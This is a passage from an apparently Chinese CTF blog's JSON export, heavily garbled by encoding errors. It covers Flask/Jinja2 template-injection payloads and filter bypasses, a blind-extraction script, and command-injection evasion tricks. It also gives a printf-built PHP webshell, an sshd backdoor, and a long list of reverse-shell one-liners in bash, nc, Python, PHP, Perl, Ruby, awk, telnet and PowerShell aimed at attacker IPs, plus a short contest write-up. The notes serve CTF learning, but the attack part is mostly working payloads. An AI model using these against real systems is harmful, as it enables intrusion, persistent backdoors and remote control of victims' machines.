çš„è¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå¯»æ‰¾ä¸å¸¦ warpper çš„): 12&#39;&#39;.__class__.__mro__[2].__subclasses__()[99].__init__&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__ æŸ¥çœ‹å…¶å¼•ç”¨ __builtins__ 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;] è¯»å†™æ–‡ä»¶ 12345678#è¯»&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()#å†™&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).write()#è‹¥å­˜åœ¨å­æ¨¡å—,å¯ä»¥ç›´æ¥è°ƒç”¨è¯»å†™æ–‡ä»¶[].__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()[].__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).write() 0x02å‘½ä»¤æ‰§è¡Œåˆ©ç”¨eval è¿›è¡Œå‘½ä»¤æ‰§è¡Œ1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;) åˆ©ç”¨warnings.catch_warnings è¿›è¡Œå‘½ä»¤æ‰§è¡ŒæŸ¥çœ‹warnings.catch_warningsæ–¹æ³•çš„ä½ç½® 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59 æŸ¥çœ‹linecatchçš„ä½ç½® 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#39;linecache&#39;)25 æŸ¥æ‰¾osæ¨¡å—çš„ä½ç½® 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)12 æŸ¥æ‰¾systemæ–¹æ³•çš„ä½ç½®(åœ¨è¿™é‡Œä½¿ç”¨os.open().read()å¯ä»¥å®ç°ä¸€æ ·çš„æ•ˆæœ,æ­¥éª¤ä¸€æ ·,ä¸å†å¤è¿°) 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.keys().index(&#39;system&#39;)144 è°ƒç”¨systemæ–¹æ³• 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)root0 åˆ©ç”¨commands è¿›è¡Œå‘½ä»¤æ‰§è¡Œ123&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read() 0x04å¸¸è§ç»•è¿‡æ–¹å¼ç»•è¿‡ä¸­æ‹¬å·pop() å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚ 1&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read() åœ¨è¿™é‡Œä½¿ç”¨popå¹¶ä¸ä¼šçœŸçš„ç§»é™¤,ä½†å´èƒ½è¿”å›å…¶å€¼,å–ä»£ä¸­æ‹¬å·,æ¥å®ç°ç»•è¿‡ è¿‡æ»¤å¼•å·request.args æ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§,ä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°,è¿™é‡ŒæŠŠpathå½“ä½œå˜é‡å,å°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥,è¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ 1&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd å…ˆè·å–chrå‡½æ•°ï¼Œèµ‹å€¼ç»™chrï¼Œåé¢æ‹¼æ¥å­—ç¬¦ä¸²å°±å¥½äº†ï¼š 1&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; è¿‡æ»¤ä¸‹åˆ’çº¿åŒæ ·åˆ©ç”¨request.argså±æ€§ 1&#123;&#123; &#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__ å°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesåˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚ 1234#GET:&#123;&#123; &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;#POST:class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__ è¿‡æ»¤å…³é”®å­—base64ç¼–ç ç»•è¿‡__getattribute__ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶,è°ƒç”¨è¯¥æ–¹æ³• ä¾‹å¦‚è¢«è¿‡æ»¤æ‰__class__å…³é”®è¯ 1&#123;&#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125; å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ 1&#123;&#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125; åŒæ—¶ç»•è¿‡ä¸‹åˆ’çº¿ã€ä¸ä¸­æ‹¬å·1&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)|attr(request.values.name5)()&#125;&#125;post:name1&#x3D;__class__&amp;name2&#x3D;__base__&amp;name3&#x3D;__subclasses__&amp;name4&#x3D;pop&amp;name5&#x3D;read ç»•è¿‡.è¿‡æ»¤è‹¥.ä¹Ÿè¢«è¿‡æ»¤ï¼Œä½¿ç”¨åŸç”ŸJinJa2å‡½æ•°|attr()å°†request.__class__æ”¹æˆrequest|attr(&quot;__class__&quot;) è¯»å–configä¸­flag,ç»•è¿‡ç›´æ¥ä½¿ç”¨config1&#123;&#123;config&#125;&#125; åˆ©ç”¨self1&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; è¿˜å¯ä»¥åˆ©ç”¨flaskçš„å†…ç½®å‡½æ•°å’Œç±»url_forã€gã€requestã€namespaceã€lipsumã€rangeã€sessionã€dictã€get_flashed_messagesã€cyclerã€joinerã€configç­‰ 123&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125; è¿‡æ»¤å¤§æ‹¬å·1å¯ä»¥åˆ©ç”¨&#123;%%&#125;æ›¿ä»£&#123;&#123;&#125;&#125; ç›²æ³¨æ–‡ä»¶å†…å®¹12345678910111213141516171819202122232425&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;flag&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39;%&#125;~p0~&#123;% endif %&#125;#è„šæœ¬import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;&#39;def check(payload): postdata &#x3D; &#123; &#39;exploit&#39;:payload &#125; r &#x3D; requests.post(url, data&#x3D;postdata).content return &#39;~p0~&#39; in rpassword &#x3D; &#39;&#39;s &#x3D; r&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\\&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\\\\]^&#96;&#123;|&#125;~\\&#39;&quot;_%&#39;for i in xrange(0,100): for c in s: payload &#x3D; &#39;&#123;% if &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;&#x2F;flag&quot;).read()[&#39;+str(i)+&#39;:&#39;+str(i+1)+&#39;] &#x3D;&#x3D; &quot;&#39;+c+&#39;&quot; %&#125;~p0~&#123;% endif %&#125;&#39; if check(payload): password +&#x3D; c break print password 0x05å¸¸ç”¨payload1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"Python","slug":"Python","permalink":"https://yanmymickey.github.io/tags/Python/"},{"name":"FlaskSSTI","slug":"FlaskSSTI","permalink":"https://yanmymickey.github.io/tags/FlaskSSTI/"}]},{"title":"å‘½ä»¤æ‰§è¡Œçš„å„ç§å§¿åŠ¿","date":"2020-03-11T16:00:00.000Z","path":"2020/03/12/CTF/linuxå‘½ä»¤æ‰§è¡Œçš„å§¿åŠ¿/","text":"å‘½ä»¤æ‰§è¡Œçš„å„ç§å§¿åŠ¿æ¯”èµ›æ¯”çš„æ˜¯ç»„åˆæ‹³,ç†è§£åŸç†,çµæ´»è¿ç”¨ å§¿åŠ¿ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦12Linuxä¸­ï¼š%0a(å¯ä»¥è¡¨ç¤ºå‘½ä»¤ç»“æŸ) ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||Windowsä¸­ï¼š%0aã€&amp;ã€|ã€%1aï¼ˆä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼‰ ç»•è¿‡ç©ºæ ¼12#ä¸‹é¢è¿™äº›éƒ½å¯ä»¥èµ·åˆ°å’Œç©ºæ ¼æ ·çš„ä½œç”¨&lt;,&lt;&gt;,%20(ç©ºæ ¼),%09(Tab),$IFS$9(ä¹Ÿå¯ä»¥ç”¨$1ç­‰ç­‰,åªæ˜¯$9åœ¨linuxå§‹ç»ˆä¸ºç©ºå­—ç¬¦),$&#123;IFS&#125;,$IFS å·§ç”¨èŠ±æ‹¬å·123åœ¨Linux bashä¸­è¿˜å¯ä»¥ä½¿ç”¨&#123;OS_COMMAND,ARGUMENT&#125;æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤&#123;ls,&#125;Desktop Documents ... é»‘åå•ç»•è¿‡æ‹¼æ¥ç»•è¿‡12æ¯”å¦‚ï¼ša&#x3D;l;b&#x3D;s;$a$bå°±ç›¸å½“äºls ç¼–ç ç»•è¿‡base64ç¼–ç 123#æ³¨æ„,éœ€è¦ä½¿ç”¨ç®¡é“ç¬¦,å› ä¸ºbase64å‘½ä»¤åªæ¥å—æ ‡å‡†çš„è¾“å…¥å’Œè¾“å‡ºecho &quot;Y2F0IC9mbGFn&quot;|base64-d|bashcat &#x2F;flag Hex12#ç”±äºlinuxè‡ªåŠ¨è§£æhex,æ‰€ä»¥å¯ä»¥ä½¿ç”¨hexç»•è¿‡,\\x20æ˜¯ç©ºæ ¼,ä¹Ÿå¯èƒ½è¢«ban &#x3D;&#x3D;&gt;cat &#x2F;flag oct1234567891011121314151617181920#&#123;&#125;æˆ–è€…()éƒ½å¯ä»¥$æŠŠè¿™ä¸ªè¾“å‡ºå½“æˆå˜é‡,ç„¶åæ‰§è¡Œ$(printf &quot;\\154\\163&quot;) &#x3D;&#x3D;&gt;ls$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag#å¯ä»¥é€šè¿‡è¿™æ ·æ¥å†™webshell,å†…å®¹ä¸º&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;$&#123;printf,&quot;\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76&quot;&#125; &gt;&gt; a.php#åˆ©ç”¨åå¼•å·&#96;&#96;printf &quot;\\154\\163&quot;&#96;--&gt;&gt;ls#ç»•è¿‡&#x2F;printf &quot;2f&quot; &#x2F;æˆ–è€…å¯ä»¥ä»$PATHä¸­å–&#x2F; echo $PATH|cut -c 1 å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡ï¼Œåæ–œæ ç»•è¿‡12345ca&#39;&#39;t flag ca&quot;&quot;t flag ca\\t flagéƒ½ç›¸å½“äºcat flag é•¿åº¦é™åˆ¶1234linuxä¸‹å¯ä»¥ç”¨ &gt;a åˆ›å»ºæ–‡ä»¶åä¸ºaçš„ç©ºæ–‡ä»¶ls -t&gt;teståˆ™ä¼šå°†ç›®å½•æŒ‰æ—¶é—´æ’åºåå†™è¿›testæ–‡ä»¶ä¸­shå‘½ä»¤å¯ä»¥ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¯»å–å‘½ä»¤æ¥æ‰§è¡Œhttps:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2748 åˆ©ç”¨Shell ç‰¹æ®Šå˜é‡ç»•è¿‡ å˜é‡ å«ä¹‰ $0 å½“å‰è„šæœ¬çš„æ–‡ä»¶å $n ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯1ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯2ã€‚è€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚ $# ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•° $* ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚ $@ ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ã€‚ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚è¢«åŒå¼•å·åŒ…å‡½æ—¶ï¼Œä¸$*ç¨æœ‰ä¸åŒ $? ä¸Šä¸ªå‘½ä»¤çš„æ¨å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼ $$ å½“å‰shellè¿›ç¨‹ID é€šé…ç¬¦è¯¦ç»†å‚è€ƒé˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—â€”â€”å‘½ä»¤è¡Œé€šé…ç¬¦æ•™ç¨‹ å­—ç¬¦ è§£é‡Š * åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦ ï¼Ÿ åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ [list] åŒ¹é…æŒ‡å®šèŒƒå›´å†…(list)ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ [^list] åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ [!list] åŒä¸Š {str1,str2} åŒ¹é…str1æˆ–è€…str2å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ IFS ç”±æˆ–æˆ– CR ç”±äº§ç”Ÿ ! æ‰§è¡Œhistoryä¸­çš„å‘½ä»¤ å…¶ä¸­ï¼š [â€¦]è¡¨ç¤ºåŒ¹é…æ–¹æ‹¬å·ä¹‹ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚æ¯”å¦‚[aeiou]å¯ä»¥åŒ¹é…äº”ä¸ªå…ƒéŸ³å­—æ¯ï¼Œ[a-z]åŒ¹é…ä»»æ„å°å†™å­—æ¯ã€‚ {â€¦}è¡¨ç¤ºåŒ¹é…å¤§æ‹¬å·é‡Œé¢çš„æ‰€æœ‰æ¨¡å¼ï¼Œæ¨¡å¼ä¹‹é—´ä½¿ç”¨é€—å·åˆ†éš”ã€‚ 1234567891011121314151617181920echo d&#123;a,e,i,u,o&#125;gdag deg dig dug dog#å¤§æ‹¬å·å¯ä»¥åµŒå¥—ä½¿ç”¨echo &#123;j&#123;p,pe&#125;g,png&#125;jpg jpeg png#&#123;start..end&#125;åŒ¹é…è¿ç»­å­—ç¬¦cat &#x2F;f&#123;a..z&#125;agcat: &#x2F;faag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;fbag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;fcag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;fdag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;feag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;ffag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;fgag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;fhag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;fiag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;fjag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•cat: &#x2F;fkag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•flag&#123;test&#125;... {â€¦}ä¸[â€¦]æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åŒºåˆ«ã€‚å¦‚æœåŒ¹é…çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œ[â€¦]ä¼šå¤±å»æ¨¡å¼çš„åŠŸèƒ½ï¼Œå˜æˆä¸€ä¸ªå•çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œ{â€¦}ä¾ç„¶å¯ä»¥å±•å¼€ã€‚ é€šé…ç¬¦æœ‰æ—¶å¯ä»¥èµ·å¥‡æ•ˆ 12cat fla* cat$&#123;IFS&#125;fl* **æ³¨æ„:**åˆæ˜¯è¿˜ä¼šé‡åˆ°flag çš„è´ªå©ªåŒ¹é…/.*f*.l*.a*.g*/è¿™æ˜¯æ‹¼æ¥ä»€ä¹ˆçš„åŸºæœ¬ä¸èƒ½ç”¨,å°±ä¸å¾—ä¸è€ƒè™‘ç¼–ç ç­‰å…¶ä»–å§¿åŠ¿ åå¼¹shellç›®æ ‡æœºæ‰§è¡Œåå¼¹shellçš„å‘½ä»¤,æ”»å‡»æœºç”¨ncå¼€å¯ç›‘å¬å°±è¡Œ æ”»å‡»æœº1nc -lvvp 8080 ç›®æ ‡æœºbash1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.1168.0.1&#x2F;8080 0&gt;&amp;1 exec1exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done ssh12345678910111213141516171819å—å®³ä¸»æœºæ‰§è¡Œ:ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8080; æ”»å‡»æœºå™¨:ssh root@192.168.3.251 -p 8080 [ç”¨æˆ·åroot,å¯†ç éšæ„]ç®€æ˜“SSH wrapperåé—¨(åŸç†æœªæµ‹è¯•)å—å®³ä¸»æœºæ‰§è¡Œ:cd &#x2F;usr&#x2F;sbinmv sshd ..&#x2F;binecho &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt; sshdecho &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshdecho &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd&#x2F;etc&#x2F;init.d&#x2F;sshd restartæ”»å‡»æœºå™¨:socat STDIO TCP4:x.x.x.x:22,souceport&#x3D;13337 NCåå¼¹1234567891011#nc å¦‚æœå®‰è£…äº†æ­£ç¡®çš„ç‰ˆæœ¬ï¼ˆå­˜åœ¨-e é€‰é¡¹å°±èƒ½ç›´æ¥åå¼¹shellï¼‰nc -e &#x2F;bin&#x2F;sh ip port#å—å®³ä¸»æœº:rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc x.x.x.x 8080 &gt; &#x2F;tmp&#x2F;f#æ”»å‡»ä¸»æœºå…ˆç›‘å¬8080ç«¯å£:nc -lvvp 8080#ç±»ä¼¼çš„å‘½ä»¤mknod backpipe p;nc ip prot 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe Awk**æ³¨æ„:**æ”»å‡»çš„æœºå™¨ç›‘å¬ï¼Œåœ¨æ”¶åˆ°shellçš„æ—¶å€™ä¸å¯ä»¥åªè¾“å…¥enterï¼Œä¸ç„¶ä¼šæ–­å¼€ 1awk &#39;BEGIN&#123;s&#x3D;&quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;ip&#x2F;port&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39; Telnetåå¼¹1234567891011å—å®³ä¸»æœº:telnet 192.168.3.251 8080 | &#x2F;bin&#x2F;bash | telnet 192.168.3.251 1080æ”»å‡»ä¸»æœº:nc -lvp 1080 nc -lvp 8080 &#x2F;&#x2F;è¿™é‡Œè¾“å…¥å‘½ä»¤å¯ä»¥åœ¨1080çœ‹åˆ°ç»“æœå—å®³æœºå™¨:mknod test p &amp;&amp; telnet ip port 0&lt;test | &#x2F;bin&#x2F;bash 1&gt;testæ”»å‡»ï¼šnc -lvvp 8080topå‘½ä»¤çœ‹ä¸åˆ°ç»“æœï¼Œå› ä¸ºä¸æ˜¯tty python123python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;#è¿˜å¯ä»¥é…åˆsstiæ³¨å…¥æ‰§è¡Œbashåå¼¹ php1php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; Perl1perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;prot;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39; Ruby1ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; Windwos1234567WIndowsPS C:\\&gt; Import-Module .\\powercat.ps1PS C:\\&gt; powercat -c 192.168.3.251 -p 8081 -e cmd -g &gt;&gt; payload.ps1# nc -lvp 8081 ç„¶åå¼€å§‹ç›‘å¬payloadå›è¿çš„ç«¯å£powershell â€“exec bypass â€“Command &quot;&amp; &#123;Import-Module &#39;C:\\payload.ps1&#39;&#125;&quot;#æŒ‚åœ¨åå°æ‰§è¡Œ æŸ¥çœ‹å†…å®¹å‘½ä»¤1catã€tacã€moreã€lessã€headã€tailã€nlã€sedã€sortã€uniq","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"Linuxå‘½ä»¤","slug":"Linuxå‘½ä»¤","permalink":"https://yanmymickey.github.io/tags/Linux%E5%91%BD%E4%BB%A4/"}]},{"title":"CTFSHOWå¹³å°èŒæ–°èµ›WP","date":"2020-03-05T16:00:00.000Z","path":"2020/03/06/CTF_WP/ctfshow_èŒæ–°èµ›/","text":"CTFSHOWå¹³å°èŒæ–°èµ›webã€Cryptoéƒ¨åˆ†miscWEBwebç­¾åˆ°ä»£ç å¾ˆç®€å•,å‘½ä»¤æ‰§è¡Œ åˆ©ç”¨å‘½ä»¤åˆ†éš”ç¬¦ payload 123https:&#x2F;&#x2F;e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show&#x2F;?url&#x3D;1;ls;echohttps:&#x2F;&#x2F;e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show&#x2F;?url&#x3D;1;cat%20flag;echo webç»™å¥¹æ‰«ç›®å½•.å‘ç°gitæ³„éœ²,githackæ‰’ä¸‹æ¥,ä»£ç ä¸å…¨,ä½†æ˜¯å¯ä»¥çœ‹åˆ°hitn.php 1234&lt;?php$pass&#x3D;sprintf(&quot;and pass&#x3D;&#39;%s&#39;&quot;,addslashes($_GET[&#39;pass&#39;]));$sql&#x3D;sprintf(&quot;select * from user where name&#x3D;&#39;%s&#39; $pass&quot;,addslashes($_GET[&#39;name&#39;]));?&gt; åˆ©ç”¨sprintfå’Œaddslashesçš„æ¼æ´ å‚è€ƒæœçš„ä¸€ç¯‡æ–‡ç« ã€PHPã€‘ç”±ä¸€æ¬¡CTFå¼•å‘çš„å­¦ä¹ ç¬”è®°ä¹‹PHPçš„sprintfå‡½æ•° æ‰“å¼€æ˜¯404é¡µé¢,ä½†æ˜¯f12æŸ¥çœ‹çŠ¶æ€ç æ˜¯200,è¯´æ˜æ˜¯å‡çš„404,è€Œä¸”æœ‰phpæ–‡ä»¶æ˜¾ç¤º,f12,å‘ç°htmlé¡µé¢çš„æ³¨é‡Šæç¤º,æŸ¥çœ‹cookies,å‘ç°æ˜¯16è¿›åˆ¶,è½¬æ¢æ˜¯flag.txt,å…ˆè€ƒè™‘ç›´æ¥æ–‡ä»¶åŒ…å«,æç¤ºno flagå†è€ƒè™‘æ ¹æ®åˆ©ç”¨ä¼ªåè®®,å…ˆè¯•äº†base64,æç¤ºno base64,æ¢æˆrot13æˆåŠŸè¯»å– php://filter/read=string.rot13/resource=/flag webå‡èµ›ç”Ÿçè’™çš„ é¡µé¢æºä»£ç è¯´è¦ç™»å½• æ²¡æœ‰è´¦å·,å…ˆæ³¨å†Œ å…ˆæ³¨å†Œadmin,ä¸å…è®¸ admÄ±n admÄ±n(ä¸æ‡‚åŸç†,çè’™çš„)æ³¨å†Œ, ç”¨admin adminç™»å½•,æˆåŠŸç™»å½•admin æ ¹æ®æ­£åˆ™åŒ¹é…,cä¸ä¼ å€¼å°±å¯ä»¥è¿‡ webæ•°æ®åŠæ ¼äº†robots.txt,å‘ç°ä½¿ç”¨debug è®¡ç®—æœº,æŒ‰ä¸ª1+1,å‘ç°æ•°æ®åŒ…,åœ¨æœ€åéšä¾¿åŠ ä¸ªç¬¦å· 1http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1&#123; 